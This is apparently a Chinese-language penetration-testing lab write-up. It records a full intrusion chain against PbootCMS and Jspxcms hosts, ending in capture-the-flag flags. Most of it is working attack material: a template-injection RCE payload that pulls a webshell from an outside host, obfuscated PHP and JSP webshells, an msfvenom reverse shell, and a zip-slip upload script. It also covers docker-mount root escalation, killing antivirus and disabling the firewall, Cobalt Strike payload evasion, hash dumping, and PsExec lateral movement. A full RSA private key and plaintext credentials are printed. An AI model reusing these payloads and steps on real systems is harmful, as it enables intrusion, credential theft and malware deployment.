|_http-title: PbootCMS-\xE6\xB0\xB8\xE4\xB9\x85\xE5\xBC\x80\xE6\xBA\x90\xE5\x85\x8D\xE8\xB4\xB9\xE7\x9A\x84PHP\xE4\xBC\x81\xE4\xB8\x9A\xE7\xBD\x91\xE7\xAB\x99\xE5\xBC\x80\xE5\x8F\x91\xE5\xBB\xBA\xE8\xAE\xBE\xE7\xAE\xA1\xE7\x90...
888/tcp  open  tcpwrapped
3306/tcp open  tcpwrapped
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_mysql-info: ERROR: Script execution failed (use -d to debug)
8888/tcp open  http       Ajenti http control panel
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: \xE5\xAE\x89\xE5\x85\xA8\xE5\x85\xA5\xE5\x8F\xA3\xE6\xA0\xA1\xE9\xAA\x8C\xE5\xA4\xB1\xE8\xB4\xA5
|_Requested resource was http://www.cf1.com:8888/login
|_http-favicon: OSS-Labs BT Panel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.56 seconds
```

> 21,22,80,888,3306,8888

#### 端口开放

10.223.82.21  

开放 `80 888 22 8888 21 3306`   

### 目录扫描

#### dirsearch

```bash
dirsearch -u http://www.cf1.com
```

```bash
[09:50:38] 200 -   26B  - /.gitattributes
[10:11:29] 301 -  293B  - /apps  ->  http://www.cf1.com/apps/
[10:16:46] 200 -    1KB - /cgi-bin/test-cg
[10:20:51] 301 -  293B  - /core  ->  http://www.cf1.com/core/
```

#### gobuster

```bash
gobuster dir -u http://www.cf1.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "php,rar,zip,tar.gz" -t 20 --no-error
```



```bash
http://www.cf1.com/config/database.php~
http://www.cf1.com/config.tar.gz
http://www.cf1.com/admin.php
http://www.cf1.com/data/c6613b090db86e60916afb3af6f923d2.db
```

### 查看网站

#### 数据库配置文件

```bash
http://www.cf1.com/config/database.php~
```



```bash
<?php
/**
 * 主数据库连接参数，未配置的参数使用框架惯性配置
 * 如果修改为mysql数据库，请同时修改type和dbname两个参数
 */
return array(
    
    'database' => array(
        
        'type' => 'sqlite', // 数据库连接驱动类型: mysqli,sqlite,pdo_mysql,pdo_sqlite
        
        'host' => '127.0.0.1', // 数据库服务器
        
        'user' => 'pboot', // 数据库连接用户名
        
        'passwd' => '123456', // 数据库连接密码
        
        'port' => '3306', // 数据库端口
                          
        // 'dbname' => 'pbootcms' // 去掉注释，启用mysql数据库，注意修改前面的连接信息及type为mysqli
        
        'dbname' => '/data/c6613b090db86e60916afb3af6f923d2.db' // 去掉注释，启用Sqlite数据库，注意修改type为sqlite
    )

);
```

##### 数据库密码

> sqlite
>
> pboot / 123456
>
> /data/c6613b090db86e60916afb3af6f923d2.db

#### 网站备份文件

http://www.cf1.com/config.tar.gz

```bash
<?php
return array(
    
    // 授权码，多个授权码使用英文逗号隔开，如：'aaaaa,bbbbb'
    'sn' => '4D6A150771,DB3767B99F',
    
    // 授权用户手机
    'sn_user' => '',
    
    // 模板内容输出缓存开关
    'tpl_html_cache' => 0,
    
    // 模板内容缓存有效时间（秒）
    'tpl_html_cache_time' => 900,
    
    // 会话文件使用网站路径
    'session_in_sitepath' => 1,
    
    // 默认分页大小
    'pagesize' => 15,
    
    // 分页条数字数量
    'pagenum' => 5,
    
    // 访问页面规则，如禁用浏览器、操作系统类型
    'access_rule' => array(
        'deny_bs' => 'MJ12bot,IE6,IE7'
    ),
    
    // 上传配置
    'upload' => array(
        'format' => 'jpg,jpeg,png,gif,xls,xlsx,doc,docx,ppt,pptx,rar,zip,pdf,txt,mp4,avi,flv,rmvb,mp3,otf,ttf',
        'max_width' => '1920',
        'max_height' => ''
    ),
    
    // 缩略图配置
    'ico' => array(
        'max_width' => '1000',
        'max_height' => '1000'
    ),
    
    // 模块模板路径定义
    'tpl_dir' => array(
        'home' => '/template'
    )

);
 
```



#### 数据库文件

http://www.cf1.com/data/c6613b090db86e60916afb3af6f923d2.db

##### sqlitebrowser

```bash
sqlitebrowser c6613b090db86e60916afb3af6f923d2.db
```

> ay_user
>
> admin / 8187bef2c0b83e6b0b747d92b0a65eb1

###### hash碰撞

https://www.somd5.com/

```bash
8187bef2c0b83e6b0b747d92b0a65eb1
3e6b1812df726be884ddcfc4139128db
admin7788
```

两次解密，再次解密获得密码明文

获取管理员账户密码

> admin/admin7788

##### sqlite3

```bash
sqlite3 c6613b090db86e60916afb3af6f923d2.db
.tables
select * from ay_user;
```



```bash
└─# sqlite3 c6613b090db86e60916afb3af6f923d2.db
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
ay_area           ay_extfield       ay_message        ay_syslog       
ay_company        ay_form           ay_model          ay_tags         
ay_config         ay_form_field     ay_role           ay_type         
ay_content        ay_label          ay_role_area      ay_user         
ay_content_ext    ay_link           ay_role_level     ay_user_role    
ay_content_sort   ay_menu           ay_site         
ay_diy_telephone  ay_menu_action    ay_slide        
sqlite> structure ay_user
   ...> ;
Parse error: near "structure": syntax error
  structure ay_user ;
  ^--- error here
sqlite> select * from ay_user;
1|10001|admin|超级管理员|8187bef2c0b83e6b0b747d92b0a65eb1|1|22|182398835|admin|admin|2017-05-08 18:50:30| 2024-12-13 10:34:09
sqlite> 
```

拿到用户名和密码MD5

> 8187bef2c0b83e6b0b747d92b0a65eb1

###### hash解密

https://crackstation.net

| **Hash**                         | **Type** | **Result** |
| -------------------------------- | -------- | ---------- |
| 8187bef2c0b83e6b0b747d92b0a65eb1 | md5(md5) | admin7788  |

#### 后台

http://www.cf1.com/admin.php

> admin / admin7788

主机地址 	192.168.8.88

### 命令执行

> 基础设置-站点信息-站点描述

#### phpinfo

```bash
{pboot:if(implode('', ['c','a','l','l','_','u','s','e','r','_','f','u','n','c'])(implode('',['p','h','p','i','n','f','o'])))}!!!{/pboot:if}
```

#### xxx.php

蚁剑生成木马：生成shell插件 

```bash
<?php // 使用时请删除此行, 连接密码: xxx ?>
<?php $nhOE=create_function(chr(897-861).chr(41745/363).chr(56277/507).chr(0x17422/0x36a).chr(0135714/0734),chr(0x1155b/0x2bf).chr(0420-0232).chr(0x12b56/0x316).chr(0xdc-0x70).str_rot13('(').str_rot13('$').str_rot13('f').str_rot13('b').chr(0x313-0x2a6).base64_decode('ZQ==').chr(591-550).str_rot13(';'));$nhOE(base64_decode('Mjc2N'.'TM7QG'.'V2QWw'.'oJF9Q'.''.str_rot13('G').str_rot13('1').base64_decode('Tg==').chr(0x136-0xe1).chr(432-345).''.''.str_rot13('3').base64_decode('aA==').base64_decode('NA==').base64_decode('ZQ==').chr(0x5dca/0x157).''.'0pOzg'.'yOTU5'.'Ow=='.''));?>
```

#### http

```bash
python -m http.server 80
```

#### 上传webshell

##### xxx1.php

```bash
<?php file_put_contents("xxx2.php",file_get_contents("http://10.223.47.114/xxx.php"))?>
```

##### poc

```bash
{pboot:if(implode('',['f','i','l','e','_','p','u'.'t','_c','o','n','t','e','n','t','s'])(implode('',['xxx1','.php']),implode('',['<?php file_','put_','contents(','"xxx2.php",','file','_get_','contents("','http://10.223.47.114/xxx.php"))?>'])))}!!!{/pboot:if}
```



```bash
POST /admin.php?p=/Site/mod HTTP/1.1
Host: www.cf1.com
Content-Length: 1099
Cache-Control: max-age=0
Origin: http://www.cf1.com
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://www.cf1.com/admin.php?p=/Site/index
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: lg=cn; PbootSystem=4fcb1vrm48ik6mmpk6uj9av0ag
Connection: keep-alive

formcheck=70920681c85ccc8f59e0d173c3f12ae4&title=cs&subtitle=%E6%B0%B8%E4%B9%85%E5%BC%80%E6%BA%90%E5%85%8D%E8%B4%B9%E7%9A%84PHP%E4%BC%81%E4%B8%9A%E7%BD%91%E7%AB%99%E5%BC%80%E5%8F%91%E5%BB%BA%E8%AE%BE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F&domain=www.cf1.com&logo=%2Fstatic%2Fupload%2Fimage%2F20241213%2F1734054943148688.png&upload=&keywords=cms%2C%E5%85%8D%E8%B4%B9cms%2C%E5%BC%80%E6%BA%90cms%2C%E4%BC%81%E4%B8%9Acms%2C%E5%BB%BA%E7%AB%99cms&description=%7Bpboot%3Aif%28implode%28%27%27%2C%5B%27f%27%2C%27i%27%2C%27l%27%2C%27e%27%2C%27_%27%2C%27p%27%2C%27u%27.%27t%27%2C%27_c%27%2C%27o%27%2C%27n%27%2C%27t%27%2C%27e%27%2C%27n%27%2C%27t%27%2C%27s%27%5D%29%28implode%28%27%27%2C%5B%27xxx1%27%2C%27.php%27%5D%29%2Cimplode%28%27%27%2C%5B%27%3C%3Fphp+file_%27%2C%27put_%27%2C%27contents%28%27%2C%27%22xxx2.php%22%2C%27%2C%27file%27%2C%27_get_%27%2C%27contents%28%22%27%2C%27http%3A%2F%2F10.223.47.114%2Fxxx.php%22%29%29%3F%3E%27%5D%29%29%29%7D%21%21%21%7B%2Fpboot%3Aif%7D&icp=%E6%B9%98ICP%E5%A4%8788888888%E5%8F%B7&theme=default&statistical=&copyright=Copyright+%C2%A9+2018-2020+PbootCMS+All+Rights+Reserved.
```



##### 访问

http://www.cf1.com/xxx1.php

触发生成xxx2.php



```bash
GET /xxx1.php HTTP/1.1
Host: www.cf1.com
Cookie: lg=cn; PbootSystem=4fcb1vrm48ik6mmpk6uj9av0ag
Sec-Ch-Ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Priority: u=0, i
Connection: keep-alive


```



### 蚁剑

```bash
http://www.cf1.com/xxx2.php
xxx
```

#### 测试命令行

```bash
whoami
```

有`disablefunc`函数不能执行命令

> 蚁剑-信息获取-phpinfo

![image-20241213124825627](https://image.201068.xyz/assets/16.高级渗透测试实操(寻找立足点)/image-20241213124825627.png)

#### 绕过disable_func

> 蚁剑-辅助插件-绕过disable_func

![image-20241213124302913](https://image.201068.xyz/assets/16.高级渗透测试实操(寻找立足点)/image-20241213124302913.png)

#### shell命令

```bash
whoami			#www
ifconfig		#192.168.8.88
cat /etc/passwd	# 发现cf1有命令执行权限
ls /home/cf1	#发现私钥
```



> www
>
> 192.168.8.88
>
> `cf1:x:1000:1000:CF1,,,:/home/cf1:/bin/bash`
>
> id_rsa
>
> id_rsa.pub

#### 获取私钥

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwuAUbGPsg+25KOe7WnPl3mXbjlcoucI8K1aJkWPaeLfdTEpI
JvRDqU8pW3klnGh4WDl4n/MjwbD/aQbLnkhbsCSiG5D/ltzdnUTxl7cyqeKomRM/
IGjn1Tjvpa5SsXZ3JMMHwvlsvPuy94sAtPqJFndBvC4o4kngZvNW2cuqxB44fOtn
ZcCz7GIQCFphkyXXyvGqU5TrO7eRnU+2GZezY3htQu+WKv3w6dM2prFv1VPekgld
IDRq3r57q2K9Fkrb9xvFqBApvjeRVljypHA+IlZB2yGRp02uHRQC06hGQ2f8te0T
e/FPHm5JblqyYKgAKmJG5rVwyFt3FUMiAp4BZQIDAQABAoIBABtcv0Fg3mq/zEnU
D9hpgZMylhtsXYmHnk8vfW1uqdRdbLMzkuH1VjLFrLbtUbyeZpdsqmU7DIA7zAEB
NUHqQwV+f0yDlX+nT26vqYR18qUr8CReMXTphfPIZM3MpkvIqH3+7G4R+5SlesGL
QPQoYWtIH3C+wnrTiLCr5jv6fuW+YYibO8hENHGDWPjr/0j025cs72FUEiQ0aSGf
3QMKgi08eAXSyjQDKi4m6K2g0xMc/83O4OOl59gcqEhOvMVTFBxhiZOUeJoFrHBK
H9qBWmAAR+s1v1VFFGgStZOSOyXQhtcAHCF/8Dn+sfr999WiFN25CnqSqWkaP5OI
4I3iJ8ECgYEA9eUmllQvpJjFC+2/xpPRz0g7HWMJjGMxXzvOnui1Ypc/9gIdFn4Y
3TSBhR8LMKA0nQcHIK1ElFOxndkjknCupiggnBS+snznBUbYnDELRQRzgsV4dj8H
sQcK8ALI7KScqd0/rUunLqhSgiDa2eQmD5XsPNfsx93tElslNH7N2b0CgYEAyuIx
o0puYFiusjG5JWdCjAr2BTnksARabTEDmsEsD3u/PyjuGHDSNarwlBTSdhIC2qRc
k4LT673V8FKUfQxTctxYMZy4VtvgB7Ge744DMGKjfGLl9lKeL+i2n+lNxo/yiBtr
RG0L7cZtWPom6OlJSMZfcZ1bjNL16e92j1nI/MkCgYEApS2hlipHNtJIy5KR2NtD
fXKQA1Wb/GpFqCuMyMKZ1fi0RpV05L8gBLhYqQwJgEieDz3BU/oQr3LpRZevhZec
OpGKFk75Kv0sUyccKw/m+h3bWmU8XnJIwGpytneocQ7DDnhJZigDzhvUEQXw/Z18
08tqPhTuQfSaZFJF09W6giECgYBQatIUEHeptt0gAreJjOGC0wFrVuQ/pKoXJ9tu
5uzJAlru9RFTHL0lyqjreUlmxYLeGVIcojnP8oIvbPwwiMc2+wH2QFGNFEA7rHr8
J0U6U47LygOu3FaZVNu2jOpoLzyKGJwvFi4pRIKpRxZPMdD7iK3iQeY87o3M+T78
WTFiiQKBgDpT7eYvkHuAG3fLH6DyLxiCbj0Yuf72lpNk/OU5p4iOfd6tmmfsV+uy
/JVcJjw73WU8SQgYfg3dhC16nrkxqwmBlzAwDaBPSiwipFB0mDi0wf9cQWsotUVn
640R+a3L4q2o42c+Lgv/XmeC0+udi6SQGAO07Rit2uiy1pY58olZ
-----END RSA PRIVATE KEY-----
```

### ssh 私钥登录

```bash
ssh -i id_rsa cf1@10.223.82.21
```

#### SSH 私钥报错

https://blog.csdn.net/qq_39441603/article/details/134587647?sharetype=blog&shareId=134587647&sharerefer=APP&sharesource=goven0&sharefrom=qq

```bash
ssh-keygen
```

将公钥添加到服务器的authorized_keys之后

```bash
ssh cf1@10.223.82.21 -p 17022 -i id_rsa
```



```bash
id
groups
```

确定存在docker

#### docker提权

##### 上传docker镜像

通过蚁剑上传docker镜像到`/tmp`

> alpine-minirootfs-3.17.10-x86_64.tar.gz

##### 加载镜像

```bash
docker import /tmp/alpine-minirootfs-3.17.10-x86_64.tar.gz alpine
docker images
```

查看加载镜像情况

```bash
cf1@08:~$ docker import /tmp/alpine-minirootfs-3.17.10-x86_64.tar.gz alpine
sha256:24f17b1add4c7817a62a139a99e45307efce263865a5a3bd7825d768927e539d

cf1@08:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
alpine              latest              24f17b1add4c        12 seconds ago      7.08MB
cf1@08:~$ 
```



##### 启动镜像

```bash
docker run -v /etc/:/mnt -it alpine /bin/sh
whoami
cd /mnt
cat /mnt/passwd
echo 'dockeruser:$1$dockerus$/f14fXjMyaiyzR90lxQmX/:0:0::/root:/bin/bash' >>/mnt/passwd 	#dockeruser/admin123
```

启动docker，将宿主机`/etc` 目录挂载到docker系统的`/mnt`目录下

查看当前docker下用户为root权限

切换到/mnt目录可以查看和编辑passwd

##### 新建用户

在kali下执行命令生成用户

> dockeruser/admin123

```bash
openssl passwd -1 -salt dockeruser
```



```bash
$1$dockerus$/f14fXjMyaiyzR90lxQmX/
```



```bash
┌──(root㉿kali)-[~/Desktop/learn/3]
└─# openssl passwd -1 -salt dockeruser
Password: 
$1$dockerus$/f14fXjMyaiyzR90lxQmX/
```



```bash
vi /mnt/passwd
dockeruser:$1$dockerus$/f14fXjMyaiyzR90lxQmX/:0:0::/root:/bin/bash

echo 'dockeruser:$1$dockerus$/f14fXjMyaiyzR90lxQmX/:0:0::/root:/bin/bash' >>/mnt/passwd
exit
```

> dockeruser / admin123

保存退出，并退出docker，在宿主机下确认文件修改成功



##### dockeruser

使用新建的用户和密码登录

```bash
su dockeruser
admin123

cat /root/flag
```

##### 提权成功

```bash
root@08:/home/cf1# cd 
root@08:~# ls
flag
root@08:~# cat flag
flag{moon-9baf8a3d7c378f56fd1dbc1f09c16fab}
```

#### flag

> flag{moon-9baf8a3d7c378f56fd1dbc1f09c16fab}

#### 开启ssh 密码登录

```bash
vim /etc/ssh/sshd_config

ListenAddress 0.0.0.0
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords yes

vim /etc/ssh/ssh_config

PasswordAuthentication yes
PermitRootLogin yes
PermitEmptyPasswords yes

systemctl restart sshd
```

##### ssh

```bash
ssh dockeruser@10.223.82.21
admin123
```



### 宝塔

http://www.cf1.com:8888/login

```bash
/etc/init.d/bt default
```



```bash
==================================================================
BT-Panel default info!
==================================================================
外网面板地址: http://:8888/3c34c719
内网面板地址: http://192.168.8.88:8888/3c34c719
*以下仅为初始默认账户密码，若无法登录请执行bt命令重置账户/密码登录
username: iyi3rpcl
password: b0f1a4a7
If you cannot access the panel,
release the following panel port [8888] in the security group
若无法访问面板，请检查防火墙/安全组是否有放行面板[8888]端口
==================================================================
```



```bash
http://192.168.8.88:8888/3c34c719
http://www.cf1.com:8888/3c34c719

iyi3rpcl
b0f1a4a7
```

#### 上传fscan

```bash
cd /www/wwwroot/www.cf1.com
chmod +x /www/wwwroot/www.cf1.com/fscan
./fscan -h 10.223.82.0/24 >fscan2.txt
```



```bash
start infoscan
(icmp) Target 10.223.82.21    is alive
(icmp) Target 10.223.82.23    is alive
(icmp) Target 10.223.82.254   is alive
[*] Icmp alive hosts len is: 3
10.223.82.21:3306 open
10.223.82.23:445 open
10.223.82.21:445 open
10.223.82.21:888 open
10.223.82.23:8080 open
10.223.82.23:3306 open
10.223.82.23:139 open
10.223.82.21:139 open
10.223.82.23:135 open
10.223.82.21:135 open
10.223.82.254:80 open
10.223.82.21:80 open
10.223.82.21:22 open
10.223.82.21:21 open
10.223.82.21:8888 open
10.223.82.21:9999 open
[*] alive ports len is: 16
start vulscan
[*] NetInfo 
[*]10.223.82.21
   [->]WIN-E51D0KVTE03
   [->]10.10.1.1
   [->]10.10.10.1
   [->]192.168.182.1
   [->]10.223.82.21
   [->]169.254.39.91
   [->]169.254.47.102
[*] NetInfo 
[*]10.223.82.23
   [->]WIN-E51D0KVTE03
   [->]10.10.1.1
   [->]192.168.182.1
   [->]192.168.186.1
   [->]10.223.82.23
[*] WebTitle http://10.223.82.21:8888  code:302 len:219    title:Redirecting... 跳转url: http://10.223.82.21:8888/login
[*] WebTitle http://10.223.82.21       code:200 len:1282   title:没有找到站点
[*] WebTitle http://10.223.82.21:888   code:403 len:262    title:403 Forbidden
[*] WebTitle http://10.223.82.21:8888/login code:200 len:802    title:安全入口校验失败
[*] WebTitle http://10.223.82.23:8080  code:200 len:54970  title:Jspxcms演示主站 - Powered by Jspxcms
已完成 15/16 [-] ssh 10.223.82.21:22 root admin123!@# ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 
已完成 15/16 [-] ssh 10.223.82.21:22 root 12345678 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 

```



```bash
10.223.82.23:445 open
10.223.82.23:3306 open
[*]10.223.82.23
   [->]WIN-E51D0KVTE03
   [->]10.10.1.1
   [->]192.168.182.1
   [->]192.168.186.1
   [->]10.223.82.23
http://10.223.82.23:8080
```

> 10.223.82.23
>
> windows,探测有没有永恒之蓝

#### 上传frp

```bash
cd /www/wwwroot/frp_linux;./frps -c frps.toml
```

## 2.内网web—tomcat-web

### Jspxcms演示主站

http://10.223.82.23:8080

#### Jspxcms漏洞

https://blog.csdn.net/st3pby/article/details/135226272

##### 后台

http://10.223.82.23:8080/cmscp/index.do

> admin / 123456

使用 Burp Suite 进行抓包可以发现“解压文件”的接口调用情况

压缩包自动解压



#### 上传木马

##### 蚁剑生成木马

##### xxx.jsp

```bash
<%-- 使用时请删除此行, 连接密码: xxx --%>
<%!
class SCAN extends ClassLoader{
  SCAN(ClassLoader c){super(c);}
  public Class resolve(byte[] b){
    return super.defineClass(b, 0, b.length);
  }
}
public byte[] deficiency(String str) throws Exception {
  Class base64;
  byte[] value = null;
  try {
    base64=Class.forName("sun.misc.BASE64Decoder");
    Object decoder = base64.newInstance();
    value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
  } catch (Exception e) {
    try {
      base64=Class.forName("java.util.Base64");
      Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
      value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
    } catch (Exception ee) {}
  }
  return value;
}
%>
<%
String cls = request.getParameter("xxx");
if (cls != null) {
  new SCAN(this.getClass().getClassLoader()).resolve(deficiency(cls)).newInstance().equals(new Object[]{request,response});
}
%>

```

##### msf生成木马

```bash
msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.47.114 lport=6666 -f raw > shell.jsp
```



```bash
jar.exe -cvf shell.war shell.jsp
```



```bash
use exploit/multi/handler
set payload java/jsp_shell_reverse_tcp
set lhost 192.168.47.114
set lport 6666
set shell cmd.exe
run
```

nat模式的kali虚拟机需要配置转发策略



##### 压缩成war包

```bash
jar cf xxx.war xxx.jsp
```

#### 制作恶意 ZIP 文件

##### zip.py

```bash
import zipfile 
if __name__ == "__main__":
    try:
        binary = b'test' 
        zipFile = zipfile.ZipFile("xxx.zip", "a", zipfile.ZIP_DEFLATED)
        info = zipfile.ZipInfo("xxx.zip")
        with open('xxx.war', 'rb') as file:
            binary_data = file.read()
            zipFile.writestr("../../../xxx.war", binary_data)
        zipFile.close() 
    except IOError as e:
        raise e 

```



```bash
python zip.py
```



#### 上传

```bash
POST /cmscp/core/web_file_2/zip_upload.do?_site=1 HTTP/1.1
Host: 10.223.82.23:8080
Content-Length: 1213
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuK1R32hJbvntVHQs
Origin: http://10.223.82.23:8080
Referer: http://10.223.82.23:8080/cmscp/core/web_file_2/list.do?parentId=%2F1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: open_ids=%2F1; select_id=%2F1; _jspxcms=b96cd1c39e8d4e1ca02c7f6fef302a96; _site=1; JSESSIONID=CB57C841D92AB074F08009D2043FAC8D
Connection: keep-alive

------WebKitFormBoundaryuK1R32hJbvntVHQs
Content-Disposition: form-data; name="parentId"

/1
------WebKitFormBoundaryuK1R32hJbvntVHQs
Content-Disposition: form-data; name="file"; filename="xxx.zip"
Content-Type: application/x-zip-compressed

PK
```



#### 访问

http://10.223.82.23:8080/xxx/xxx.jsp

```bash
xxx=ipconfig
```



### 蚁剑

```bash
http://10.223.82.23:8080/xxx/xxx.jsp
xxx
```

#### shell命令

```bash
whoami
ipconfig
net user
net start
netstat -ano> netstat.txt
tasklist >list.txt
systeminfo >info.txt
```

> tomcat-web\administrator
>
> 10.10.1.129
>
> 192.168.8.66

#### 杀软识别

```bash
ZhuDongFangYu.exe =====> 360安全卫士-主动防御
360sd.exe =====> 360杀毒
MsMpEng.exe =====> Windows Defender
360rp.exe =====> 360杀毒
```



```bash
ZhuDongFangYu.exe             1292 Services                   0     18,236 K
MsMpEng.exe                   2080 Services                   0    269,372 K
360Tray.exe                   4616 Console                    1     42,108 K
360sd.exe                     5176 Console                    1      2,248 K
360rp.exe                     5356 Console                    1     76,188 K

```



```bash
taskkill /IM ZhuDongFangYu.exe /F
taskkill /IM MsMpEng.exe /F
taskkill /IM 360Tray.exe /F
taskkill /IM 360sd.exe /F
taskkill /IM 360rp.exe /F
```



### flag.txt

> C:/Users/Administrator/flag.txt

```bash
flag{moon-ff957ac6b575f4df61d8fae3eec96152}
```

### 上传fscan.exe

```bash
fscan -h 10.10.0.0/16 >fcsan.txt
```



```bash
10.10.1.128:445 open
[*] NetBios 10.10.1.128     fileserver.fbi.gov                  Windows Server 2016 Standard 14393
```

> 10.10.1.128

### 搭建隧道

#### frp

##### frps

```bash
bindPort = 7000
auth.token = "123456kl"
```



```bash
frps.exe -c frps.toml
```

##### frpc

```bash
serverAddr = "10.223.47.114"
serverPort = 7000
auth.token = "123456kl"

[[proxies]]
name = "rdp"
type = "tcp"
localIP = "10.10.1.129"
localPort = 3389
remotePort = 33890

[[proxies]]
name = "socks_1"
type = "tcp"
remotePort = 1080

[proxies.plugin]
type = "socks5"
```



```bash
frpc.exe -c frpc.toml >frpc.txt
```

#### Proxifier

windows

```bash
10.223.47.114
1080
socks5
```

#### proxychains

linux

```bash
vim /etc/proxychains4.conf

soscks5 127.0.0.1 1080
```





### cs

#### 启动cs

##### 开启服务器

teamserver.bat

```bash
e:
cd E:\learn\6.网安世纪\6.中车\1.中车课程资料\16.高级渗透测试实操(寻找立足点)\内网靶场\工具\cs4.0\cs4.0汉化版\cobaltstrike有修改中文
teamserver.bat 10.223.47.114 123456
```

##### 开启客户端

cs.bat

```bash
10.223.47.114
50050
123456
```

##### 开启监听器

```bash
cs
10.223.47.114
6666
```

##### 运行cs木马

生成木马,上传木马,运行木马

```bash
cs6666.exe
```

**木马被杀**

#### 掩日免杀

github：https://github.com/1y0n/AV_Evasion_Tool

下载地址：https://github.com/1y0n/AV_Evasion_Tool/releases/download/20231208/20231208.zip

##### 安装tdm64-gcc

https://github.com/jmeubank/tdm-gcc/releases/download/v9.2.0-tdm64-1/tdm64-gcc-9.2.0.exe

修改YRconfig.ini 将安装路径填入配置文件

```bash
[compiler]
GCC="D:\environment\TDM-GCC-64\bin\gcc.exe"
GO=""
```

##### 本地分离

> 不支持免杀exe文件，请换个文件重试(对于CobaltStrike，不应使用生成的beacon.exe，要生成payload.c)

cs生成.c木马：cs6666.c

掩日免杀生成：lgT6666.exe、lgT6666.txt

##### 蚁剑运行

蚁剑上传`lgT6666.exe`，`lgT6666.txt`两个文件

此模块将同时生成两个文件，一个EXE可执行文件和一个文本文件，其中文本文件可以随意重命名(包括后缀名)，但不能改变文件内容。

执行时，需要将文本文件的路径当作参数传入。

```bash
lgT6666.exe lgT6666.txt
```

#### cs上线成功

##### 获取hash

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

##### mimikaz

```bash
Administrator
SID: S-1-5-21-2718341423-369748722-180397293-500
NTLM: 42e2656ec24331269f82160ff5962387
```

##### 在线解密

https://www.somd5.com/

https://crackstation.net

> Administrator / QWEasd123

##### 关闭防火墙和杀毒软件

防火墙关闭前ping不通

```bash
netsh advfirewall set allprofiles state off

#查看结果
netsh advfirewall show allprofiles 

Control Panel\System and Security\Windows Defender Firewall\Allow an app or feature through Windows Defender Firewall
```

#### 远程桌面

##### 开启远程桌面

```bash
netstat -ano > netstat.txt
ping 10.223.47.114 >ping.txt
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
```

##### rdp连接

通过frp的socks5代理连接

```bash
mstsc
10.10.1.129
administrator / QWEasd123
```

通过frp端口转发连接

```bash
mstsc
10.223.47.114:33890
administrator / QWEasd123
```



##### 远程桌面连不上解决方法

> 出现身份验证错误。要求的函数不受支持。CredSSP 加密数据库修正

https://blog.csdn.net/weixin_40276431/article/details/111034925

```bash
gpedit.msc
在“系统“的菜单下找到“凭据分配”菜单项，点击后在右侧窗口中找到“允许分配保存的凭据用于仅NTLM服务器身份验证”一项
termsrv/*
```



```bash
regedit
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\
```

在 System之后没有的文件夹，需自己创建文件夹。

```bash
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters
```

在最底部文件夹Parameters里面，**新建 DWORD（32）位值（D）。**

文件名 “`AllowEncryptionOracle`” ，

双击打开修改数据值为 2就可以了。

```bash
新建DWORD（32）位值（D）
AllowEncryptionOracle
2
```

##### 成功连接

关闭360



## 3.文件服务器—fileserver

### cs

#### ipc$

```bash
shell dir \\10.10.1.128\c$
```

#### 横向移动

##### 生成监听器

> 10.10.1.129
>
> 4444

##### 上传木马

生成木马,上传木马

```bash
upload cs4444.exe
shell copy cs4444.exe c:\cs4444.exe
```

##### 上传PsExec.exe

在内网web服务器上上传PsExec.exe文件并执行

```bash
upload PsExec.exe
```



```bash
shell PsExec.exe \\10.10.1.128 -u administrator -p QWEasd123 -i c:/cs4444.exe
```

